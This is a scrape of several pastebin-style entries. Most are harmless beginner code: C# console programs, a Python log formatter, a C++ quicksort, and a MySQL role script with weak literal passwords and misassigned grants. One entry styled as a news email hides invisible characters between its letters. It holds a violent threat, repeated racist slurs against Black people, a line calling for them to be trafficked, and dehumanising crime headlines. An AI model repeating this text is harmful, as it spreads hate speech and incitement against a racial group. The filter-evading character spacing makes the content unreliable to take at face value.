                case ""1"":
                    Console.WriteLine(""Обмен рублей на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (rub >= currencyCount)
                    {
                        rub -= currencyCount;
                        euro += currencyCount / eurToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }
                    break;
                case ""2"":
                    Console.WriteLine(""Обмен евро на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if ( euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        rub += currencyCount / rubToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }
                    break;
            }

            Console.WriteLine($""Ваш баланс {rub}  рублей и {euro} евро"");
            Console.ReadKey();
        }
    }
}"
a5P5hrbJ,Untitled,Chefir,C#,Thursday 9th of November 2023 02:10:08 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Test
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int arrayLenght = 15;
            int[] arrayNumbers = new int[arrayLenght];
            FillArray(arrayNumbers);
            Console.WriteLine(""Исходный массив числел: "");
            OutputArray(arrayNumbers);
            Console.WriteLine(""Перемешанный массив числел: "");
            Shuffle(arrayNumbers);
            OutputArray(arrayNumbers);
        }

        static void FillArray(int[] arrayNumbers)
        {
            Random rand = new Random();
            int minNumbers = 0;
            int maxNumbers = 10;

            for (int i = 0; i < arrayNumbers.Length; i++)
            {
                arrayNumbers[i] = rand.Next(minNumbers, maxNumbers);
            }
        }

        static void OutputArray(int[] arrayNumerOutput)
        {
            for (int i = 0; i < arrayNumerOutput.Length; i++)
            {
                Console.WriteLine(arrayNumerOutput[i] + "" "");
            }
        }

        static void Shuffle(int[] arrayNumberShuffle)
        {
            Random rand = new Random();
            int shuffledElement;
            int randomIndex;

            for (int i = 0; i < arrayNumberShuffle.Length; i++)
            {
                randomIndex = rand.Next(arrayNumberShuffle.Length);
                shuffledElement = arrayNumberShuffle[randomIndex];
                arrayNumberShuffle[randomIndex] = arrayNumberShuffle[i];
                arrayNumberShuffle[i] = shuffledElement;
            }
        }"
UDL5cabe,gunicorn fields,web_mc,Python,Thursday 9th of November 2023 01:40:34 PM CDT,"from flask import g, has_request_context
from pythonjsonlogger import jsonlogger


class CustomJsonFormatter(jsonlogger.JsonFormatter):
    def add_fields(self, log_record, record, message_dict):
        super(CustomJsonFormatter, self).add_fields(log_record, record, message_dict)
        if has_request_context():
            log_record[""user_id""] = g.user_id
        else:
            log_record[""user_id""] = 111"
s2LtRQyF,02. Shopping List,Spocoman,Python,Thursday 9th of November 2023 01:37:50 PM CDT,"list_products = input().split('!')

command = input()

while command != ""Go Shopping!"":
    tokens = command.split(' ')
    command = tokens[0]
    product = tokens[1]

    if command == ""Urgent"" and product not in list_products:
        list_products.insert(0, product)
    elif command == ""Unnecessary"" and product in list_products:
        list_products.remove(product)
    elif command == ""Correct"" and product in list_products:
        new_product = tokens[2]
        list_products[list_products.index(product)] = new_product
    elif command == ""Rearrange"" and product in list_products:
        list_products.append(list_products.pop(list_products.index(product)))

    command = input()

print("", "".join(list_products))
"
a26duR8R,Untitled,fatalryuu,MySQL,Thursday 9th of November 2023 01:14:49 PM CDT,"-- Создание пользователей
DROP USER IF EXISTS 'guest'@'localhost';
CREATE USER 'guest'@'localhost'; -- гость
DROP USER IF EXISTS 'player'@'localhost';
CREATE USER 'player'@'localhost' IDENTIFIED BY 'password'; -- игрок
DROP USER IF EXISTS 'coach'@'localhost';
CREATE USER 'coach'@'localhost' IDENTIFIED BY 'password'; -- тренер
DROP USER IF EXISTS 'tournament_organizer'@'localhost';
CREATE USER 'tournament_organizer'@'localhost' IDENTIFIED BY 'password'; -- организатор турнира
DROP USER IF EXISTS 'manager'@'localhost';
CREATE USER 'manager'@'localhost' IDENTIFIED BY 'password'; -- менеджер
DROP USER IF EXISTS 'admin'@'localhost';
CREATE USER 'admin'@'localhost' IDENTIFIED BY 'password'; -- администратор

-- Права доступа для ГОСТЯ
GRANT SELECT ON `volleyball_db`.* TO 'guest'@'localhost';

-- Права доступа для ИГРОКА
GRANT SELECT, UPDATE ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для ТРЕНЕРА
GRANT SELECT, UPDATE ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT, UPDATE ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для ОРГАНИЗАТОРА ТУРНИРА
GRANT SELECT ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для ОРГАНИЗАТОРА МЕНЕДЖЕРА
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`players` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`teams` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`m2m_match_team` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`matches` TO 'player'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE ON `volleyball_db`.`coaches` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`rating` TO 'player'@'localhost';
GRANT SELECT ON `volleyball_db`.`tournaments` TO 'player'@'localhost';

-- Права доступа для АДМИНИСТРАТОРА 
GRANT ALL PRIVILEGES ON `volleyball_db`.* TO 'admin'@'localhost' WITH GRANT OPTION;
"
Ps9sF3dw,QuickSort C++,hangglider_,C++,Thursday 9th of November 2023 01:04:00 PM CDT,"#include ""bits/stdc++.h""
#define pb push_back
#define ll long long

using namespace std;

template <typename T>
static function<bool(T, T)> cmp = [](T a, T b) {
    return a < b;
};

/*template <typename T>
static bool cmp(T a, T b) {
    return a < b;
};*/

template <typename T>
T G(vector<T>& a, T l, T r) {
    auto mid = l + (r - l) / 2;
    if (a[l] > a[mid])
        swap(a[l], a[mid]);
    if (a[l] > a[r])
        swap(a[l], a[r]);
    if (a[mid] > a[r])
        swap(a[mid], a[r]);
    return mid;
}

template <typename T>
auto F(vector<T>& a, T l, T r, function<bool(T, T)> &cmp) {
    auto m = G(a, l, r);
    auto mid = a[m];
    swap(a[m], a[r]);
    auto i = l - 1;
    for (auto j = l; j <= r - 1; j++) {
        if (cmp(a[j], mid)) swap(a[++i], a[j]);
    }
    swap(a[i + 1], a[r]);
    return ++i;
}

template <typename T>
void Quicksort(vector<T> &a, T l, T r, function<bool(T, T)> &cmp){
    if (l < r){
        auto mid = F(a, l, r, cmp);
        Quicksort(a, l, mid - 1, cmp);
        Quicksort(a, mid + 1, r, cmp);
    }
}

int solve() {
    //int n = 2642245;
    ll n;
    cin >> n;
    random_device rd;
    uniform_int_distribution<long long> dist(1, pow(n, 3) - 1);
    vector<ll> a;
    for (int i = 0; i < n; i++){
        a.pb(dist(rd));
    }
    for (auto &x : a){
        printf(""%d %s"", x, "" "");
    }
    cout << endl;

    Quicksort(a, 0ll, n - 1, cmp<typeof(a[0])>);
    for (auto &x : a){
        printf(""%d %s"", x, "" "");
    }

    return 0;
}

signed main() {
    int q = 1;
    //cin >> q;
    while (q > 0){
        --q;
        solve();
        cout << endl;
    }
    system(""PAUSE"");
    return 0;
}"
xG2f7Bxv,News Nov9 23,Newscaster_Ned,Email,Thursday 9th of November 2023 01:02:23 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

A‎n‎d‎ ‎I‎f‎ ‎y‎o‎u‎ ‎e‎v‎e‎r‎ ‎p‎u‎t‎ ‎t‎w‎o‎ ‎s‎p‎l‎e‎n‎d‎a‎s‎ ‎i‎n‎ ‎m‎y‎ ‎c‎o‎f‎f‎e‎e‎ ‎a‎g‎a‎i‎n‎,‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎c‎u‎t‎ ‎y‎o‎u‎r‎ ‎f‎a‎c‎e‎ ‎i‎n‎t‎o‎ ‎t‎i‎n‎y‎ ‎p‎i‎e‎c‎e‎s‎ ‎s‎o‎ ‎y‎o‎u‎'‎l‎l‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎p‎u‎t‎ ‎i‎t‎ ‎b‎a‎c‎k‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎ ‎l‎i‎k‎e‎ ‎a‎ ‎j‎i‎g‎s‎a‎w‎ ‎p‎u‎z‎z‎l‎e‎!‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎O‎h‎ ‎h‎e‎y‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎S‎h‎o‎c‎k‎ ‎R‎e‎p‎o‎r‎t‎:‎ ‎C‎N‎N‎,‎ ‎N‎Y‎T‎,‎ ‎A‎P‎,‎ ‎R‎e‎u‎t‎e‎r‎s‎ ‎H‎a‎d‎ ‎P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎r‎s‎ ‎E‎m‎b‎e‎d‎d‎e‎d‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎a‎s‎ ‎D‎u‎r‎i‎n‎g‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎

N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎A‎n‎s‎w‎e‎r‎s‎
F‎I‎L‎E‎ ‎-‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎t‎r‎a‎n‎s‎p‎o‎r‎t‎ ‎a‎ ‎c‎a‎p‎t‎u‎r‎e‎d‎ ‎I‎s‎r‎a‎e‎l‎i‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎f‎r‎o‎m‎ ‎K‎f‎a‎r‎ ‎A‎z‎z‎a‎ ‎k‎i‎b‎b‎u‎t‎z‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎G‎a‎z‎a‎ ‎S‎t‎r‎i‎p‎ ‎o‎n‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎,‎ ‎O‎c‎t‎.‎ ‎7‎,‎ ‎2‎0‎2‎3‎.‎ ‎I‎s‎r‎a‎e‎l‎'‎s‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎ ‎b‎r‎o‎u‎g‎h‎t‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎ ‎a‎ ‎g‎r‎o‎u‎p‎ ‎o‎f‎ ‎f‎o‎r‎e‎i‎g‎n‎ ‎c‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎M‎o‎n‎d‎a‎y‎,‎ ‎O‎c‎t‎.‎ ‎1‎6‎,‎ ‎t‎o‎ ‎s‎c‎r‎e‎e‎n‎ ‎a‎ ‎4‎0‎-‎m‎i‎n‎u‎t‎e‎ ‎r‎e‎e‎l‎ ‎o‎f‎ ‎g‎r‎u‎e‎s‎o‎m‎e‎ ‎f‎o‎o‎t‎a‎g‎e‎ ‎c‎o‎m‎p‎i‎l‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎H‎a‎m‎a‎s‎ ‎a‎t‎t‎a‎c‎k‎ ‎l‎a‎s‎t‎ ‎w‎e‎e‎k‎.‎ ‎T‎h‎e‎ ‎s‎c‎r‎e‎e‎n‎i‎n‎g‎ ‎…‎
I‎s‎r‎a‎e‎l‎i‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎B‎e‎n‎j‎a‎m‎i‎n‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎’‎s‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎d‎e‎m‎a‎n‎d‎i‎n‎g‎ ‎a‎n‎s‎w‎e‎r‎s‎ ‎f‎r‎o‎m‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎p‎r‎o‎m‎i‎n‎e‎n‎t‎ ‎n‎e‎w‎s‎ ‎a‎g‎e‎n‎c‎i‎e‎s‎ ‎a‎f‎t‎e‎r‎ ‎c‎r‎i‎t‎i‎c‎i‎s‎m‎ ‎e‎m‎e‎r‎g‎e‎d‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎r‎s‎ ‎a‎p‎p‎e‎a‎r‎i‎n‎g‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎e‎m‎b‎e‎d‎d‎e‎d‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎a‎s‎ ‎t‎e‎r‎r‎o‎r‎i‎s‎t‎s‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎a‎t‎t‎a‎c‎k‎.‎

N‎o‎l‎t‎e‎:‎ ‎A‎n‎t‎i‎-‎J‎e‎w‎i‎s‎h‎ ‎H‎a‎t‎e‎ ‎C‎r‎i‎m‎e‎s‎ ‎S‎u‎r‎g‎e‎ ‎2‎1‎4‎%‎ ‎i‎n‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎-‎R‎u‎n‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎i‎t‎y‎
2‎7‎0‎
*‎*‎*‎ ‎G‎O‎P‎ ‎D‎e‎b‎a‎t‎e‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎ ‎A‎n‎d‎ ‎T‎h‎e‎n‎ ‎T‎h‎e‎r‎e‎ ‎W‎e‎r‎e‎ ‎F‎i‎v‎e‎ ‎L‎e‎f‎t‎ ‎o‎n‎ ‎S‎t‎a‎g‎e‎
*‎*‎*‎ ‎G‎O‎P‎ ‎D‎e‎b‎a‎t‎e‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎ ‎A‎n‎d‎ ‎T‎h‎e‎n‎ ‎T‎h‎e‎r‎e‎ ‎W‎e‎r‎e‎ ‎F‎i‎v‎e‎ ‎L‎e‎f‎t‎ ‎o‎n‎ ‎S‎t‎a‎g‎e‎
6‎,‎1‎5‎7‎
V‎i‎v‎e‎k‎ ‎S‎l‎a‎m‎s‎ ‎R‎N‎C‎ ‎P‎i‎c‎k‎i‎n‎g‎ ‎N‎B‎C‎ ‎f‎o‎r‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎C‎a‎l‎l‎s‎ ‎f‎o‎r‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎'‎s‎ ‎R‎e‎s‎i‎g‎n‎a‎t‎i‎o‎n‎
V‎i‎v‎e‎k‎ ‎S‎l‎a‎m‎s‎ ‎R‎N‎C‎ ‎P‎i‎c‎k‎i‎n‎g‎ ‎N‎B‎C‎ ‎f‎o‎r‎ ‎D‎e‎b‎a‎t‎e‎,‎ ‎C‎a‎l‎l‎s‎ ‎f‎o‎r‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎'‎s‎ ‎R‎e‎s‎i‎g‎n‎a‎t‎i‎o‎n‎
8‎0‎1‎
'‎V‎a‎c‎a‎t‎e‎'‎ ‎H‎e‎r‎:‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎C‎a‎l‎l‎ ‎o‎n‎ ‎R‎o‎n‎n‎a‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎ ‎t‎o‎ ‎R‎e‎s‎i‎g‎n‎
'‎V‎a‎c‎a‎t‎e‎'‎ ‎H‎e‎r‎:‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎C‎a‎l‎l‎ ‎o‎n‎ ‎R‎o‎n‎n‎a‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎ ‎t‎o‎ ‎R‎e‎s‎i‎g‎n‎
3‎,‎4‎1‎6‎
S‎h‎a‎r‎o‎n‎ ‎S‎t‎o‎n‎e‎ ‎A‎l‎l‎e‎g‎e‎s‎ ‎e‎x‎-‎H‎e‎a‎d‎ ‎o‎f‎ ‎S‎o‎n‎y‎ ‎P‎i‎c‎t‎u‎r‎e‎s‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎H‎a‎r‎a‎s‎s‎e‎d‎ ‎H‎e‎r‎
S‎h‎a‎r‎o‎n‎ ‎S‎t‎o‎n‎e‎ ‎A‎l‎l‎e‎g‎e‎s‎ ‎e‎x‎-‎H‎e‎a‎d‎ ‎o‎f‎ ‎S‎o‎n‎y‎ ‎P‎i‎c‎t‎u‎r‎e‎s‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎H‎a‎r‎a‎s‎s‎e‎d‎ ‎H‎e‎r‎
2‎8‎5‎
R‎a‎b‎b‎i‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎B‎a‎r‎c‎l‎a‎y‎:‎ ‎R‎e‎m‎e‎m‎b‎e‎r‎i‎n‎g‎ ‎K‎r‎i‎s‎t‎a‎l‎l‎n‎a‎c‎h‎t‎ ‎S‎o‎ ‎I‎t‎ ‎N‎e‎v‎e‎r‎ ‎H‎a‎p‎p‎e‎n‎s‎ ‎A‎g‎a‎i‎n‎
R‎a‎b‎b‎i‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎B‎a‎r‎c‎l‎a‎y‎:‎ ‎R‎e‎m‎e‎m‎b‎e‎r‎i‎n‎g‎ ‎K‎r‎i‎s‎t‎a‎l‎l‎n‎a‎c‎h‎t‎ ‎S‎o‎ ‎I‎t‎ ‎N‎e‎v‎e‎r‎ ‎H‎a‎p‎p‎e‎n‎s‎ ‎A‎g‎a‎i‎n‎
8‎8‎
F‎a‎c‎t‎ ‎C‎h‎e‎c‎k‎:‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎C‎l‎a‎i‎m‎s‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎I‎s‎ ‎a‎ ‎'‎D‎e‎m‎o‎c‎r‎a‎c‎y‎'‎
F‎a‎c‎t‎ ‎C‎h‎e‎c‎k‎:‎ ‎N‎i‎k‎k‎i‎ ‎H‎a‎l‎e‎y‎ ‎C‎l‎a‎i‎m‎s‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎I‎s‎ ‎a‎ ‎'‎D‎e‎m‎o‎c‎r‎a‎c‎y‎'‎
6‎7‎9‎
N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎G‎i‎v‎e‎s‎ ‎T‎h‎u‎m‎b‎s‎-‎D‎o‎w‎n‎ ‎t‎o‎ ‎E‎l‎e‎c‎t‎r‎i‎c‎ ‎S‎n‎o‎w‎ ‎P‎l‎o‎w‎s‎
N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎G‎i‎v‎e‎s‎ ‎T‎h‎u‎m‎b‎s‎-‎D‎o‎w‎n‎ ‎t‎o‎ ‎E‎l‎e‎c‎t‎r‎i‎c‎ ‎S‎n‎o‎w‎ ‎P‎l‎o‎w‎s‎
6‎9‎8‎
*‎*‎*‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎N‎i‎g‎h‎t‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎ ‎2‎0‎2‎3‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎s‎ ‎O‎f‎f‎e‎r‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎2‎0‎2‎4‎ ‎C‎l‎u‎e‎s‎
*‎*‎*‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎N‎i‎g‎h‎t‎ ‎L‎i‎v‎e‎w‎i‎r‎e‎ ‎*‎*‎*‎ ‎2‎0‎2‎3‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎s‎ ‎O‎f‎f‎e‎r‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎2‎0‎2‎4‎ ‎C‎l‎u‎e‎s‎

2‎ ‎M‎o‎n‎k‎e‎y‎s‎ ‎a‎n‎d‎ ‎a‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎1‎7‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎i‎s‎ ‎F‎r‎e‎e‎d‎ ‎f‎r‎o‎m‎ ‎H‎u‎m‎a‎n‎ ‎T‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎.‎

W‎e‎ ‎s‎h‎o‎u‎l‎d‎ ‎t‎r‎a‎f‎f‎i‎c‎ ‎t‎h‎o‎s‎e‎ ‎n‎e‎g‎r‎o‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎a‎t‎ ‎m‎u‎d‎s‎h‎a‎r‎k‎.‎


N‎e‎g‎r‎o‎ ‎P‎a‎s‎t‎o‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎C‎o‎l‎o‎r‎a‎d‎o‎ ‎S‎p‎r‎i‎n‎g‎s‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎ ‎S‎e‎x‎u‎a‎l‎ ‎A‎s‎s‎a‎u‎l‎t‎.‎


P‎h‎i‎l‎l‎y‎ ‎P‎u‎b‎e‎h‎e‎a‎d‎ ‎F‎o‎u‎n‎d‎ ‎G‎u‎i‎l‎t‎y‎ ‎o‎f‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎i‎n‎ ‎F‎r‎o‎n‎t‎ ‎o‎f‎ ‎H‎i‎s‎ ‎D‎a‎u‎g‎h‎t‎e‎r‎ ‎D‎u‎r‎i‎n‎g‎ ‎C‎a‎r‎j‎a‎c‎k‎i‎n‎g‎.‎


P‎e‎n‎n‎s‎y‎l‎v‎a‎n‎i‎a‎ ‎T‎r‎o‎o‎p‎e‎r‎ ‎i‎n‎ ‎C‎r‎i‎t‎i‎c‎a‎l‎ ‎C‎o‎n‎d‎i‎t‎i‎o‎n‎ ‎A‎f‎t‎e‎r‎ ‎C‎o‎o‎n‎ ‎S‎h‎o‎o‎t‎s‎ ‎H‎i‎m‎ ‎D‎u‎r‎i‎n‎g‎ ‎T‎r‎a‎f‎f‎i‎c‎ ‎S‎t‎o‎p‎.‎


L‎i‎v‎i‎n‎g‎ ‎P‎i‎e‎c‎e‎ ‎o‎f‎ ‎S‎h‎i‎t‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎t‎i‎n‎g‎ ‎P‎i‎c‎t‎u‎r‎e‎s‎ ‎o‎f‎ ‎L‎i‎t‎t‎l‎e‎ ‎G‎i‎r‎l‎s‎ ‎w‎i‎t‎h‎ ‎S‎e‎x‎u‎a‎l‎ ‎C‎o‎m‎m‎e‎n‎t‎s‎ ‎o‎n‎ ‎I‎n‎s‎t‎a‎g‎r‎a‎m‎.‎


F‎i‎f‎t‎h‎ ‎M‎o‎n‎k‎e‎y‎ ‎W‎h‎o‎ ‎S‎h‎o‎t‎ ‎C‎u‎o‎m‎o‎ ‎A‎i‎d‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎.‎


N‎e‎g‎r‎o‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎S‎l‎a‎p‎s‎ ‎M‎i‎d‎d‎l‎e‎ ‎S‎c‎h‎o‎o‎l‎ ‎G‎i‎r‎l‎ ‎i‎n‎ ‎t‎h‎e‎ ‎F‎a‎c‎e‎ ‎a‎t‎ ‎B‎r‎o‎n‎x‎ ‎S‎c‎h‎o‎o‎l‎.‎


N‎e‎g‎r‎e‎s‎s‎ ‎W‎h‎o‎ ‎C‎u‎t‎ ‎o‎u‎t‎ ‎H‎e‎r‎ ‎U‎n‎b‎o‎r‎n‎ ‎N‎i‎g‎l‎e‎t‎ ‎G‎e‎t‎s‎ ‎4‎0‎ ‎t‎o‎ ‎L‎i‎f‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎h‎a‎t‎?‎ ‎O‎h‎ ‎r‎i‎g‎h‎t‎ ‎t‎h‎e‎ ‎w‎e‎a‎t‎h‎e‎r‎.‎

T‎h‎u‎ ‎0‎9‎ ‎|‎ ‎D‎a‎y‎
7‎8‎°‎
7‎3‎%‎
N‎
1‎3‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎w‎i‎t‎h‎ ‎o‎c‎c‎a‎s‎i‎o‎n‎a‎l‎ ‎l‎i‎g‎h‎t‎ ‎r‎a‎i‎n‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎T‎h‎u‎n‎d‎e‎r‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎H‎i‎g‎h‎ ‎7‎8‎F‎.‎ ‎W‎S‎W‎ ‎w‎i‎n‎d‎s‎ ‎s‎h‎i‎f‎t‎i‎n‎g‎ ‎t‎o‎ ‎N‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎7‎0‎%‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
2‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎5‎0‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
5‎:‎3‎7‎ ‎p‎m‎
T‎h‎u‎ ‎0‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎4‎°‎
7‎7‎%‎
N‎
1‎5‎
 ‎
m‎p‎h‎
A‎ ‎s‎t‎e‎a‎d‎y‎ ‎r‎a‎i‎n‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎.‎ ‎S‎h‎o‎w‎e‎r‎s‎ ‎c‎o‎n‎t‎i‎n‎u‎i‎n‎g‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎5‎4‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎8‎0‎%‎.‎ ‎R‎a‎i‎n‎f‎a‎l‎l‎ ‎n‎e‎a‎r‎ ‎a‎ ‎q‎u‎a‎r‎t‎e‎r‎ ‎o‎f‎ ‎a‎n‎ ‎i‎n‎c‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
3‎:‎1‎9‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎3‎9‎ ‎p‎m‎
F‎r‎i‎ ‎1‎0‎
C‎l‎o‎u‎d‎y‎
